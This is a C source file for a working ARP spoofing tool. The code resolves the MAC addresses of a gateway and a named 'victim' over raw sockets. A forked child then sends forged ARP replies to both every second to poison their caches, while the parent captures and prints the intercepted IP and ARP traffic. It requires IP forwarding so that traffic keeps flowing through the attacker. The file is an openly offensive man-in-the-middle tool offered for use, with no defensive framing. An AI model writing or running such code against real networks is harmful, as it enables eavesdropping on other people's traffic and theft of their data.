#include "arp.h"

#include "socketSetup.h"
#include "arpLib.h"

#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>

//Ignore unused return values
#pragma GCC diagnostic ignored "-Wunused-result"

// ERROR CODES
enum errCode
{
	BAD_PARAMETERS,
	ARP_REQ_TO_GATEWAY,
	ARP_REP_FROM_GATEWAY,
	ARP_REP_TO_GATEWAY,
	ARP_REQ_TO_VICTIM,
	ARP_REP_FROM_VICTIM,
	ARP_REP_TO_VICTIM,
};


//Struct holding all required information to run ARP spoofing application
typedef struct {
	socket_aux socketInfo;
	uint8_t gatewayMAC[6];
	uint8_t gatewayIP[4];
	uint8_t victimMAC[6];
	uint8_t victimIP[4];
} arpPoisonData_t;

//Capture an packet and print its content
void receivePacket(arpPoisonData_t *arpData)
{
	union eth_buffer buffer_u = {0};

	/* To receive data (in this case we will inspect ARP and IP packets)... */
	int numbytes = recvfrom(arpData->socketInfo.sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);

	if(numbytes > 0)
	{
		printf("got a packet, %d bytes\n", numbytes);
	}	

	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
		printPacket((enum arpPkt) ntohs(buffer_u.cooked_data.payload.arp.operation), &buffer_u);
	}
	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
		printf("IP packet - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
			buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
			buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
			buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
			buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
			buffer_u.cooked_data.payload.ip.proto
		);
	}
}


//Child process created to poison 
void arpPoisonProcess(arpPoisonData_t* arpData)
{
	while(1)
	{	
		// Send ARP Reply to gatway
		sendARPReplyPacket(&arpData->socketInfo, arpData->gatewayIP, arpData->gatewayMAC, arpData->victimIP);
		printPacket(REPLY, NULL);

		// Send ARP Reply to victim
		sendARPReplyPacket(&arpData->socketInfo, arpData->victimIP, arpData->victimMAC, arpData->gatewayIP);
		printPacket(REPLY, NULL);

		//wait to send another message
		sleep(1);
	}	
}

void printHelp()
{
	printf("Usage: ./arpspoofing.out <interface name> <gateway IP> <victim IP>\n");
	printf("E.G.: ./arpspoofing.out enp2s0 192.168.0.1 192.168.0.2\n");
}

int isIPForwardEnabled()
{
	int result = 1;	//Operation result
	FILE *fp;		//Pipe output

	//Create pipe to get 'cat' program response
	fp = popen("cat /proc/sys/net/ipv4/ip_forward", "r");	
	
	if (fp == NULL) 
	{
		//Fail to execute command
		printf("Fail to verify if IP forward is enabled (/proc/sys/net/ipv4/ip_forward)\n");
		result = -2;
	}
	else
	{
		//Extract IP forward config value
		int isIPFwdEnabled;
		fscanf(fp, "%d", &isIPFwdEnabled);
		pclose(fp);
		
		//Terminate application if IP forward is not enabled
		if (isIPFwdEnabled != 1) 
		{
			result = -3;
			printf("Fail to run application. IP Forward is not enabled in this host\n");
			printf("Please execute: sudo sysctl -w net.ipv4.ip_forward=1\n");
		}
	}

	return result;
}

void errorHandler(int errorCode, int *result)
{
	*result = -1;
	switch(errorCode)
	{
		case BAD_PARAMETERS:
			printHelp();
			break;
		case ARP_REQ_TO_GATEWAY:
			printf("Fail to send ARP Request packet to Gateway\n");
			break;
		case ARP_REP_FROM_GATEWAY:
			printf("Fail to receive ARP Reply packet from Gateway\n");
			break;
		case ARP_REP_TO_GATEWAY:
			printf("Fail to send ARP Reply packet to Gateway\n");
			break;
		case ARP_REQ_TO_VICTIM:
			printf("Fail to send ARP Request packet to Victim\n");
			break;
		case ARP_REP_FROM_VICTIM:
			printf("Fail to receive ARP Reply packet from Victim\n");
			break;
		case ARP_REP_TO_VICTIM:
			printf("Fail to send ARP Reply packet to Victim\n");
			break;
		default:
			printf("Invalid ERROR code\n");
			break;
	}
}


int main(int argc, char *argv[])
{
	int result = 1;	//Operation result
	arpPoisonData_t arpData; //Struct holding all required information to run ARP spoofing application

	if (argc != 4) 
	{
		printHelp();
		result = -1;
	}
	else
	{	
		//Scan Gateway IP
		sscanf(argv[2], "%hhu.%hhu.%hhu.%hhu", &arpData.gatewayIP[0], &arpData.gatewayIP[1], &arpData.gatewayIP[2], &arpData.gatewayIP[3]);
		//Scan Victim IP
		sscanf(argv[3], "%hhu.%hhu.%hhu.%hhu", &arpData.victimIP[0], &arpData.victimIP[1], &arpData.victimIP[2], &arpData.victimIP[3]);
	}

	//Check if port forward is enabled
	if (result == 1) {
		result = isIPForwardEnabled();
	}
	
	//Create socket and set up interface to promiscouos mode
	if(result == 1)
	{
		result = socketSetup(argc, argv, &arpData.socketInfo);
	}

	if (result == 1) 
	{
		union eth_buffer receivedPacket;	//Temporary buffer to reveive ARP packages from victims
		initPackets(&arpData.socketInfo);	//Initialize ARP library

		//Ask the gateway MAC Address
		if(sendARPRequestPacket(&arpData.socketInfo, arpData.gatewayIP, arpData.victimIP) <= 0)
		{
			printf("Fail to send ARP Request packet to Gateway\n");
			result = -2;
		}
		else
		{
			printPacket(REQUEST, NULL);
		}
		//Get response
		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.gatewayIP) <= 0))
		{
			printf("Fail to receive ARP Reply packet from Gateway\n");
			result = -3;
		}
		if (result == 1) 
		{
			memcpy(arpData.gatewayMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
			printPacket(RECEIVED, &receivedPacket);
		}
		
		//Ask the victim MAC Address
		if((result == 1) && (sendARPRequestPacket(&arpData.socketInfo, arpData.victimIP, arpData.gatewayIP) <= 0))
		{
			printf("Fail to send ARP Request packet to Victim\n");
			result = -4;
		}
		else
		{
			printPacket(REQUEST, NULL);
		}
		//Get response
		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.victimIP) <= 0))
		{
			printf("Fail to receive ARP Reply packet from Victim\n");
			result = -5;
		}
		if (result == 1) 
		{
			memcpy(arpData.victimMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
			printPacket(RECEIVED, &receivedPacket);
		}		
	}
	

	/* End of configuration. Now we can send and receive data using raw sockets. */
	if(result == 1)
	{		
		// Create the child process that will periodically send ARP Reply messages (poison gateway / victim)
		pid_t child_id = fork();
		if (child_id == 0)
		{
			arpPoisonProcess(&arpData);
		}
		else
		{
			//Host process: Receive and print packets
			while(1)
			{
				receivePacket(&arpData);
			}

			//Finalize: Kill child process and close socket
			kill(child_id, SIGKILL);
			shutdown(arpData.socketInfo.sockfd, 2);   //Stop both reception and transmission of the socket
		}
	}

	return result;
}
